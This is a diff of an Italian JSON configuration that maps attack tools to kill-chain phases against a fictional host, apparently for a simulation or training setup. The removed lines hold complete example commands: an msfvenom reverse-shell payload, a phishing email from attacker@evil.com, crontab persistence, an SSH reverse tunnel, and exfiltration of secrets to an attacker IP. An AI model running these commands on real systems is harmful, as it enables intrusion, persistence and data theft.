@@ -3,108 +3,85 @@
     "tool_details": {
       "nmap": {
         "descrizione": "Scanner di rete per identificare porte aperte, servizi e versioni su host target.",
-        "quando_usarlo": "Fase di ricognizione, per ottenere una panoramica dei servizi esposti dal target.",
-        "esempi": ["nmap shopcorp.local"]
+        "quando_usarlo": "Fase di ricognizione, per ottenere una panoramica dei servizi esposti dal target."
       },
       "whois": {
         "descrizione": "Raccoglie informazioni di registrazione su un dominio (DNS, registrant, nameserver).",
-        "quando_usarlo": "Fase di ricognizione, per raccogliere dati pubblici e OSINT sul dominio target.",
-        "esempi": ["whois shopcorp.local"]
+        "quando_usarlo": "Fase di ricognizione, per raccogliere dati pubblici e OSINT sul dominio target."
       },
       "theHarvester": {
         "descrizione": "Tool OSINT per raccogliere email, subdomain e host legati a un dominio.",
-        "quando_usarlo": "In ricognizione, per identificare account, host e info utili a successivi attacchi di social engineering o phishing.",
-        "esempi": ["theHarvester -d shopcorp.local -b all"]
-      },
-      "setoolkit": {
-        "descrizione": "Toolkit per attacchi di ingegneria sociale (phishing, spear-phishing, payload delivery).",
-        "quando_usarlo": "Weaponization, per creare campagne di phishing mirate o generatori di payload sociali.",
-        "esempi": ["setoolkit"]
+        "quando_usarlo": "In ricognizione, per identificare account, host e info utili a successivi attacchi di social engineering o phishing."
       },
       "msfvenom": {
         "descrizione": "Generatore di payload/shellcode personalizzati per molteplici piattaforme.",
-        "quando_usarlo": "Weaponization, per creare un payload da consegnare al target.",
-        "esempi": ["msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f elf -o payload.elf"]
+        "quando_usarlo": "Weaponization, per creare un payload da consegnare al target."
       },
       "empire": {
         "descrizione": "Framework post-exploitation e C2 per Windows, Linux e macOS.",
-        "quando_usarlo": "Weaponization o post-sfruttamento, per gestire agenti e payload avanzati.",
-        "esempi": ["sudo python3 /opt/Empire/setup/setup_database.py"]
+        "quando_usarlo": "Weaponization o post-sfruttamento, per gestire agenti e payload avanzati."
       },
       "scp": {
         "descrizione": "Strumento per trasferire file in modo sicuro tramite SSH tra host.",
-        "quando_usarlo": "Delivery, per inviare un payload o file malevoli al target.",
-        "esempi": ["scp payload.elf mario.rossi@shopcorp.local:/tmp"]
+        "quando_usarlo": "Delivery, per inviare un payload o file malevoli al target."
       },
       "sendEmail": {
         "descrizione": "Strumento a linea di comando per inviare email con allegati.",
-        "quando_usarlo": "Delivery, per consegnare payload tramite email (phishing).",
-        "esempi": ["sendEmail -f attacker@evil.com -t mario.rossi@shopcorp.local -u 'Urgente!' -m 'Vedi allegato' -a payload.elf -s smtp.shopcorp.local:25"]
+        "quando_usarlo": "Delivery, per consegnare payload tramite email (phishing)."
       },
       "smbclient": {
         "descrizione": "Client SMB/CIFS per accedere o inviare file su share di rete Windows/Samba.",
-        "quando_usarlo": "Delivery, per copiare un payload in una cartella condivisa sul target.",
-        "esempi": ["smbclient //shopcorp.local/shared -U mario.rossi -c 'put payload.elf'"]
+        "quando_usarlo": "Delivery, per copiare un payload in una cartella condivisa sul target."
       },
       "metasploit": {
         "descrizione": "Framework per exploit e gestione di sessioni meterpreter.",
-        "quando_usarlo": "Exploit, per eseguire un exploit e ricevere una shell di controllo sul target.",
-        "esempi": ["msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.10.10.20; set LPORT 4444; exploit'"]
+        "quando_usarlo": "Exploit, per eseguire un exploit e ricevere una shell di controllo sul target."
       },
       "sqlmap": {
         "descrizione": "Tool automatico per testare e sfruttare vulnerabilità SQL injection.",
-        "quando_usarlo": "Exploit, per estrarre dati da database vulnerabili via SQL injection.",
-        "esempi": ["sqlmap -u 'http://shopcorp.local/login.php' --dump"]
+        "quando_usarlo": "Exploit, per estrarre dati da database vulnerabili via SQL injection."
       },
       "hydra": {
         "descrizione": "Strumento per attacchi brute-force su protocolli di autenticazione.",
-        "quando_usarlo": "Exploit, per testare credenziali deboli su servizi esposti.",
-        "esempi": ["hydra -l mario.rossi -P rockyou.txt ssh://shopcorp.local"]
+        "quando_usarlo": "Exploit, per testare credenziali deboli su servizi esposti."
       },
       "ssh": {
         "descrizione": "Accesso remoto sicuro via terminale.",
-        "quando_usarlo": "Installation e Command & Control, per ottenere o mantenere l'accesso.",
-        "esempi": ["ssh mario.rossi@shopcorp.local"]
+        "quando_usarlo": "Installation e Command & Control, per ottenere o mantenere l'accesso."
       },
       "crontab": {
         "descrizione": "Permette di schedulare comandi/script su base temporale.",
-        "quando_usarlo": "Installation, per garantire persistenza dell'accesso.",
-        "esempi": ["(crontab -l; echo '@reboot /tmp/payload.elf') | crontab -"]
+        "quando_usarlo": "Installation, per garantire persistenza dell'accesso."
       },
       "systemctl": {
         "descrizione": "Controlla i servizi di sistema su sistemi Linux con systemd.",
-        "quando_usarlo": "Installation, per configurare l'avvio automatico di malware o backdoor.",
-        "esempi": ["sudo systemctl enable payload.service"]
+        "quando_usarlo": "Installation, per configurare l'avvio automatico di malware o backdoor."
       },
       "nc": {
         "descrizione": "Strumento versatile per debug di rete e connessioni reverse shell.",
-        "quando_usarlo": "Command & Control, per stabilire una shell remota dal target.",
-        "esempi": ["nc -lvp 4444"]
+        "quando_usarlo": "Command & Control, per stabilire una shell remota dal target."
       },
       "ncat": {
         "descrizione": "Versione avanzata di netcat con supporto SSL e più opzioni.",
-        "quando_usarlo": "Command & Control, per sessioni persistenti cifrate.",
-        "esempi": ["ncat --ssl -l 5555 --keep-open"]
+        "quando_usarlo": "Command & Control, per sessioni persistenti cifrate."
       },
       "tar": {
         "descrizione": "Archivia file e directory.",
-        "quando_usarlo": "Actions on Objectives, per esfiltrare dati compressi.",
-        "esempi": ["tar czf secrets.tar.gz /etc/secret"]
+        "quando_usarlo": "Actions on Objectives, per esfiltrare dati compressi."
       },
       "rclone": {
         "descrizione": "Sincronizza o copia file tra sistemi e cloud.",
-        "quando_usarlo": "Actions on Objectives, per esfiltrare dati verso server controllati.",
-        "esempi": ["rclone copy secrets.tar.gz attacker@10.10.10.20:/home/attacker/"]
+        "quando_usarlo": "Actions on Objectives, per esfiltrare dati verso server controllati."
       }
     },
     "kill_chain": [
-      {"fase": "ricognizione", "tool_consentiti": ["nmap", "whois", "theHarvester"], "comandi_di_esempio": ["nmap shopcorp.local", "whois shopcorp.local", "theHarvester -d shopcorp.local -b all"]},
-      {"fase": "weaponization", "tool_consentiti": ["setoolkit", "msfvenom", "empire"], "comandi_di_esempio": ["msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f elf -o payload.elf", "setoolkit", "sudo python3 /opt/Empire/setup/setup_database.py"]},
-      {"fase": "delivery", "tool_consentiti": ["scp", "sendEmail", "smbclient"], "comandi_di_esempio": ["scp payload.elf mario.rossi@shopcorp.local:/tmp", "sendEmail -f attacker@evil.com -t mario.rossi@shopcorp.local -u 'Urgente!' -m 'Vedi allegato' -a payload.elf -s smtp.shopcorp.local:25", "smbclient //shopcorp.local/shared -U mario.rossi -c 'put payload.elf'"]},
-      {"fase": "exploit", "tool_consentiti": ["metasploit", "sqlmap", "hydra"], "comandi_di_esempio": ["msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.10.10.20; set LPORT 4444; exploit'", "sqlmap -u 'http://shopcorp.local/login.php' --dump", "hydra -l mario.rossi -P rockyou.txt ssh://shopcorp.local"]},
-      {"fase": "installation", "tool_consentiti": ["ssh", "crontab", "systemctl"], "comandi_di_esempio": ["ssh mario.rossi@shopcorp.local", "(crontab -l; echo '@reboot /tmp/payload.elf') | crontab -", "sudo systemctl enable payload.service"]},
-      {"fase": "command_and_control", "tool_consentiti": ["nc", "ssh", "ncat"], "comandi_di_esempio": ["nc -lvp 4444", "ssh -R 2222:localhost:22 attacker@10.10.10.20", "ncat --ssl -l 5555 --keep-open"]},
-      {"fase": "actions_on_objectives", "tool_consentiti": ["tar", "rclone", "scp"], "comandi_di_esempio": ["tar czf secrets.tar.gz /etc/secret", "rclone copy secrets.tar.gz attacker@10.10.10.20:/home/attacker/", "scp secrets.tar.gz attacker@10.10.10.20:/home/attacker/"]}
+      {"fase": "ricognizione", "tool_consentiti": ["nmap", "whois", "theHarvester"]},
+      {"fase": "weaponization", "tool_consentiti": ["msfvenom", "empire"]},
+      {"fase": "delivery", "tool_consentiti": ["scp", "sendEmail", "smbclient"]},
+      {"fase": "exploit", "tool_consentiti": ["metasploit", "sqlmap", "hydra"]},
+      {"fase": "installation", "tool_consentiti": ["ssh", "crontab", "systemctl"]},
+      {"fase": "command_and_control", "tool_consentiti": ["nc", "ssh", "ncat"]},
+      {"fase": "actions_on_objectives", "tool_consentiti": ["tar", "rclone", "scp"]}
     ]
   }
 }
